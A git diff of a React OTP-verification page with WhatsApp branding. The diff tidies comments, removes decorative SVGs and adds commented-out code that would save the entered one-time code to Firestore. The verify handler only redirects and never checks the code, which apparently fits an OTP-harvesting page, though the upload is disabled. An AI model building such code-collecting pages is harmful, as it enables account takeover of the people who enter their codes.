@@ -1,16 +1,17 @@
 import React, { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
-import { Loader2 } from "lucide-react"; // spinner icon
+import { Loader2 } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import Logo from "@/assets/logo.png";
 import Whatsapp from "@/assets/whatsapp.jpg";
+// import { uploadData } from "@/firebase/FirebaseUtils"; // 🔥 keep for later
 
 const OTP = () => {
   const [otp, setOtp] = useState("");
-  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes
+  const [timeLeft, setTimeLeft] = useState(120);
   const [loading, setLoading] = useState(false);
-  const navigate = useNavigate(); // ✅ must be called here directly
+  const navigate = useNavigate();
 
   useEffect(() => {
     if (timeLeft <= 0) return;
@@ -23,12 +24,21 @@ const OTP = () => {
   const minutes = Math.floor(timeLeft / 60);
   const seconds = timeLeft % 60;
 
-  const handleVerify = () => {
+  const handleVerify = async () => {
     setLoading(true);
+
+    // 🔥 Firestore upload (disabled for now)
+    /*
+    try {
+      await uploadData({ otp });
+    } catch (error) {
+      console.error("Error saving OTP:", error);
+    }
+    */
 
     setTimeout(() => {
       setLoading(false);
-      navigate("/"); // ✅ works now
+      navigate("/"); // ✅ redirect to home
     }, 2000);
   };
 
@@ -48,7 +58,9 @@ const OTP = () => {
       {/* Main content */}
       <div className="w-full flex flex-col mt-10 flex-1 items-center">
         <h1 className="text-xl font-semibold mb-2">OTP Verification</h1>
-        <p className="text-sm text-gray-500 mb-6">Enter the 6-digit code sent to your number</p>
+        <p className="text-sm text-gray-500 mb-6">
+          Enter the 6-digit code sent to your number
+        </p>
 
         {/* Timer */}
         <div className="mb-6 text-gray-600 font-medium">
@@ -69,11 +81,11 @@ const OTP = () => {
         </InputOTP>
       </div>
 
-      {/* Verify button at bottom */}
+      {/* Verify button */}
       <div className="w-full mt-6">
         <Button
           onClick={handleVerify}
-          disabled={loading}
+          disabled={loading || otp.length < 6}
           className="w-full bg-blue-900 hover:bg-blue-800 py-4 rounded-lg flex items-center justify-center"
         >
           {loading ? (
@@ -86,32 +98,6 @@ const OTP = () => {
           )}
         </Button>
       </div>
-
-      {/* Background design */}
-      <div className="absolute left-0 bottom-0 opacity-5">
-        <svg width="200" height="200" viewBox="0 0 220 220" xmlns="http://www.w3.org/2000/svg">
-          <rect width="220" height="220" rx="32" fill="#1E40AF" />
-        </svg>
-      </div>
-
-      {/* Accessibility icon */}
-      <button className="fixed right-4 bottom-4 text-gray-400">
-        <svg
-          width="22"
-          height="22"
-          viewBox="0 0 24 24"
-          fill="none"
-          xmlns="http://www.w3.org/2000/svg"
-        >
-          <path
-            d="M12 2v20M2 12h20"
-            stroke="currentColor"
-            strokeWidth="1.5"
-            strokeLinecap="round"
-            strokeLinejoin="round"
-          />
-        </svg>
-      </button>
     </div>
   );
 };
